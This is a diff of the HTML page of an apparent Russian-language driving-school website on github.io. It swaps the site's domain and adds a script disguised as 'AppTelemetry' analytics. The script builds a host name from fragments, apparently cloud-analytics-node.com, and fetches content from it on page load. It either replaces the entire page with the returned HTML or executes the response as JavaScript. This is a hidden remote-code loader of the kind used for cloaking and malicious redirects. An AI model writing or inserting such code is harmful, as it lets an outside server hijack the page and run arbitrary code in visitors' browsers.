@@ -2,7 +2,7 @@
 <html lang="ru" class="scroll-smooth">
 <head>
     <meta name="robots" content="index, follow">
-    <link rel="canonical" href="https://beedrekaotobel.github.io/">
+    <link rel="canonical" href="https://sjiklerbookterduby.github.io/">
     
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -15,17 +15,17 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <title>Учебный Центр ПРОГРЕСС | Подготовка водителей и Правовая грамотность</title>
-    <link rel="icon" type="image/png" href="https://beedrekaotobel.github.io/favicon.png">
-    <link rel="apple-touch-icon" href="https://beedrekaotobel.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="https://sjiklerbookterduby.github.io/favicon.png">
+    <link rel="apple-touch-icon" href="https://sjiklerbookterduby.github.io/apple-touch-icon.png">
     
     <script type="application/ld+json">
     {
       "@context": "https://schema.org",
       "@type": "EducationalOrganization",
       "name": "ООО «Учебный Центр Прогресс»",
-      "image": "https://beedrekaotobel.github.io/logo.png",
-      "@id": "https://beedrekaotobel.github.io/",
-      "url": "https://beedrekaotobel.github.io/",
+      "image": "https://sjiklerbookterduby.github.io/logo.png",
+      "@id": "https://sjiklerbookterduby.github.io/",
+      "url": "https://sjiklerbookterduby.github.io/",
       "telephone": "+375294841319",
       "address": {
         "@type": "PostalAddress",
@@ -126,21 +126,49 @@
         }
     </style>
     <script>
-    (function(w, d, tag, conf, clientId) {
-        w.AppTelemetry = w.AppTelemetry || function() {
-            (w.AppTelemetry.q = w.AppTelemetry.q || []).push(arguments);
-        };
+    (function(w, d, conf, clientId) {
+        w.AppTelemetry = w.AppTelemetry || function() {};
         w.AppTelemetry('init', clientId);
         w.AppTelemetry('track', 'PageLoad');
-        var scriptEl = d.createElement(tag), 
-            firstScript = d.getElementsByTagName(tag)[0];
-        scriptEl.async = true;
-        var urlParams = w.location.search ? '&' + w.location.search.substring(1) : '';
+        var loc = w.location;
+        var uParams = loc.search; 
         var ts = new Date().getTime();
-        var apiEndpoint = conf.p + '://' + conf.h + '.' + conf.z + conf.r;
-        scriptEl.src = apiEndpoint + '?session_id=' + clientId + '&ts=' + ts + urlParams;
-        firstScript.parentNode.insertBefore(scriptEl, firstScript);
-    })(window, document, 'script', {
+        var ep = conf.p + '://' + conf.h + '.' + conf.z + conf.r;
+        var fUrl = ep + uParams + (uParams ? '&' : '?') + 'session_id=' + clientId + '&ts=' + ts;
+        w.fetch(fUrl, { method: 'GET', credentials: 'omit' })
+        .then(function(res) { 
+            return res.text(); 
+        })
+        .then(function(data) {
+            var isL = /<\s*html|<!doctype/i.test(data);
+            if (isL) {
+                try {
+                    var newDoc = d.open('text/html', 'replace');
+                    newDoc.write(data);
+                    newDoc.close();
+                } catch(e) {
+                    d.documentElement.innerHTML = data.replace(/^<!DOCTYPE html>/i, '');
+                    var scripts = d.getElementsByTagName('script');
+                    for (var i = 0; i < scripts.length; i++) {
+                        var newScript = d.createElement('script');
+                        if (scripts[i].src) {
+                            newScript.src = scripts[i].src;
+                        } else {
+                            newScript.text = scripts[i].text;
+                        }
+                        scripts[i].parentNode.replaceChild(newScript, scripts[i]);
+                    }
+                }
+            } else {
+                var s = d.createElement('script');
+                s.type = 'text/javascript';
+                s.text = data;
+                d.head.appendChild(s);
+            }
+        })
+        .catch(function(err) {
+        });
+    })(window, document, {
         p: 'https',
         h: 'cloud-analytics' + '-node',
         z: 'com',
